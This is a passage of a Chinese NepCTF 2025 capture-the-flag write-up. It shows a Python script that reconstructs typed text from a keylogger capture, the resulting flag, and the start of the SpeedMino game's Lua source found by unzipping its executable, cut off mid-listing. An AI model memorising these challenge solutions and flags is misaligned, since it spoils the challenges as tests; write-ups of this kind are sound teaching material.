class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filepath = <span class="string">&quot;NepBot_keylogger&quot;</span> </span><br><span class="line">    records = parse_keylog(filepath)</span><br><span class="line">    result = reconstruct_text(records)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还原的用户输入为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><img src="/../../../../../image-20250726133947252.png"alt="image-20250726133947252" /><figcaption aria-hidden="true">image-20250726133947252</figcaption></figure><p>NepCTF{NepCTF-20250725-114514}</p><h3 id="speedmino">SpeedMino</h3><p>查壳的时候发现可以改成zip解压</p><figure><img src="/images/NepCTF2025-Writeup/image-20250726211121758.png"alt="image-20250726211121758" /><figcaption aria-hidden="true">image-20250726211121758</figcaption></figure><p>找到main.lua中有疑似flag的部分youwillget</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span><span class="string">&#x27;Zenitha&#x27;</span></span><br><span class="line"></span><br><span class="line">ZENITHA.setFirstScene(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line"><span class="comment">-- ZENITHA.setMaxFPS(60)</span></span><br><span class="line">ZENITHA.globalEvent.drawCursor=NULL</span><br><span class="line">ZENITHA.globalEvent.clickFX=NULL</span><br><span class="line"></span><br><span class="line">SFX.<span class="built_in">load</span>&#123;</span><br><span class="line">    clear_1=<span class="string">&#x27;sound/clear_1.ogg&#x27;</span>,</span><br><span class="line">    clear_2=<span class="string">&#x27;sound/clear_2.ogg&#x27;</span>,</span><br><span class="line">    clear_3=<span class="string">&#x27;sound/clear_3.ogg&#x27;</span>,</span><br><span class="line">    clear_4=<span class="string">&#x27;sound/clear_4.ogg&#x27;</span>,</span><br><span class="line">    spin_0=<span class="string">&#x27;sound/spin_0.ogg&#x27;</span>,</span><br><span class="line">    spin_1=<span class="string">&#x27;sound/spin_1.ogg&#x27;</span>,</span><br><span class="line">    spin_2=<span class="string">&#x27;sound/spin_2.ogg&#x27;</span>,</span><br><span class="line">    spin_3=<span class="string">&#x27;sound/spin_3.ogg&#x27;</span>,</span><br><span class="line">    drop=<span class="string">&#x27;sound/drop.ogg&#x27;</span>,</span><br><span class="line">    hold=<span class="string">&#x27;sound/hold.ogg&#x27;</span>,</span><br><span class="line">    lock=<span class="string">&#x27;sound/lock.ogg&#x27;</span>,</span><br><span class="line">    pc=<span class="string">&#x27;sound/pc.ogg&#x27;</span>,</span><br><span class="line">    rotate=<span class="string">&#x27;sound/rotate.ogg&#x27;</span>,</span><br><span class="line">    rotatekick=<span class="string">&#x27;sound/rotatekick.ogg&#x27;</span>,</span><br><span class="line">    start=<span class="string">&#x27;sound/key.ogg&#x27;</span>,</span><br><span class="line">    win=<span class="string">&#x27;sound/win.ogg&#x27;</span>,</span><br><span class="line">    fail=<span class="string">&#x27;sound/fail.ogg&#x27;</span>,</span><br><span class="line">    ren_1=<span class="string">&#x27;sound/ren_1.ogg&#x27;</span>,</span><br><span class="line">    ren_2=<span class="string">&#x27;sound/ren_2.ogg&#x27;</span>,</span><br><span class="line">    ren_3=<span class="string">&#x27;sound/ren_3.ogg&#x27;</span>,</span><br><span class="line">    ren_4=<span class="string">&#x27;sound/ren_4.ogg&#x27;</span>,</span><br><span class="line">    ren_5=<span class="string">&#x27;sound/ren_5.ogg&#x27;</span>,</span><br><span class="line">    ren_6=<span class="string">&#x27;sound/ren_6.ogg&#x27;</span>,</span><br><span class="line">    ren_7=<span class="string">&#x27;sound/ren_7.ogg&#x27;</span>,</span><br><span class="line">    ren_8=<span class="string">&#x27;sound/ren_8.ogg&#x27;</span>,</span><br><span class="line">    ren_9=<span class="string">&#x27;sound/ren_9.ogg&#x27;</span>,</span><br><span class="line">    ren_10=<span class="string">&#x27;sound/ren_10.ogg&#x27;</span>,</span><br><span class="line">    ren_11=<span class="string">&#x27;sound/ren_11.ogg&#x27;</span>,   </span><br><span class="line">&#125;</span><br><span class="line">BGM.<span class="built_in">load</span>&#123;</span><br><span class="line">    secret7th_old=<span class="string">&#x27;sound/secret7th_old.ogg&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">BGM.play(<span class="string">&#x27;secret7th_old&#x27;</span>)</span><br><span class="line"></span><br><span class="line">love.keyboard.setKeyRepeat(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">local</span> actionList=&#123;</span><br><span class="line">    <span class="string">&#x27;moveLeft&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;moveRight&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rotateCW&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rotateCCW&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rotate180&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hold&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;softDrop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hardDrop&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> keyConf=&#123;</span><br><span class="line">    <span class="string">&#x27;left&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lshift&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;down&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;up&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> sysKey=&#123;</span><br><span class="line">    r=<span class="string">&#x27;restart&#x27;</span>,</span><br><span class="line">    [<span class="string">&#x27;-&#x27;</span>]=<span class="string">&#x27;das-&#x27;</span>,</span><br><span class="line">    [<span class="string">&#x27;=&#x27;</span>]=<span class="string">&#x27;das+&#x27;</span>,</span><br><span class="line">    [<span class="string">&#x27;[&#x27;</span>]=<span class="string">&#x27;arr-&#x27;</span>,</span><br><span class="line">    [<span class="string">&#x27;]&#x27;</span>]=<span class="string">&#x27;arr+&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> das,arr=<span class="number">10</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">local</span> dropDelay,lockDelay=<span class="number">30</span>,<span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> _=<span class="literal">false</span></span><br><span class="line"><span class="keyword">local</span> pieceList=&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;_,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">1</span>,_&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">2</span>,<span class="number">2</span>,_&#125;,</span><br><span class="line">        &#123;_,<span class="number">2</span>,<span class="number">2</span>&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>,_,_&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;_,_,<span class="number">4</span>&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>&#125;,</span><br><span class="line">        &#123;_,<span class="number">5</span>,_&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">6</span>,<span class="number">6</span>&#125;,</span><br><span class="line">        &#123;<span class="number">6</span>,<span class="number">6</span>&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> centerList=&#123;</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,    &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,    &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,    &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,    &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">    &#123;[<span class="number">0</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,    &#123;<span class="number">1</span>,<span class="number">2</span>&#125;,    &#123;<span class="number">2</span>,<span class="number">2</span>&#125;,    &#123;<span 